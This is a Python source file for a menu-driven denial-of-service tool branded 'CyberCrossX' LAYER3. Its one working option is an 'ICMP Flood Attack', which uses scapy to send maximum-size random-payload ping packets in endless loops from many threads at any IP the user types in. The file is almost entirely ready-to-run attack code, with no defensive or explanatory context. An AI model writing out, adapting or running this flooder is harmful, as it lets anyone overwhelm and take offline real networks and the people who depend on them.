import os
import random
import threading
import time
import sys
from scapy.all import IP, ICMP, send

CyberCrossX = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{CyberCrossX}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ██████╗ 
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██╗
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝     █████╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗     ╚═══██╗
███████╗██║  ██║   ██║   ███████╗██║  ██║    ██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝ {clear}
               
╔═════════════════════════════════════════════════════╗
║ {CyberCrossX}*{clear} version   {CyberCrossX}:{clear}   4.0                                 ║
║ {CyberCrossX}*{clear} CyberCrossX      {CyberCrossX}:{clear}   {CyberCrossX}[{clear}{white}LAYER3{clear}{CyberCrossX}]{clear}                            ║  
╚═════════════════════════════════════════════════════╝
          
╔═════════════════════════════════════════════════════╗
║ {CyberCrossX}[{clear}1{CyberCrossX}]{clear} ICMP Flood Attack                               ║                   
║ {CyberCrossX}[{clear}3{CyberCrossX}]{clear} Exit CyberCrossX                                       ║                                 
╚═════════════════════════════════════════════════════╝  
""")
    
def layer3():
    while True:
        logo()
        select = input(f"""
╔═══[{CyberCrossX}root{clear}@{CyberCrossX}CyberCrossX{clear}]
╚══{CyberCrossX}>{clear} """)
                                        
        if select == "1" or select.lower() == "1":
            def send_packet(target):
                try:
                    while True:
                        payload = random._urandom(65500)  
                        packet = IP(dst=target) / ICMP(type=8, chksum=None) / payload

                        send(packet, verbose=False)

                        print(f"[{CyberCrossX}CyberCrossX{clear}] IP Address {CyberCrossX}:{clear} {target} {CyberCrossX}|{clear} ICMP Packet {CyberCrossX}:{clear} {white}65500{clear}")

                except Exception as e:
                    print(f"[{red}WARNING{clear}] Check your permissions or install {CyberCrossX}Npcap{clear} : https://npcap.com/#download")
                    time.sleep(2)
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(2)

            def start_threads(target, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target,))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{CyberCrossX}CyberCrossX{clear}] IP {CyberCrossX}>{clear} ")
            threads = int(input(f"[{CyberCrossX}CyberCrossX{clear}] THREAD {CyberCrossX}>{clear} "))

            start_threads(target, threads)
            

        elif select == "3" or select.lower() == "3":
            sys.exit()



if __name__ == "__main__":
    layer3()
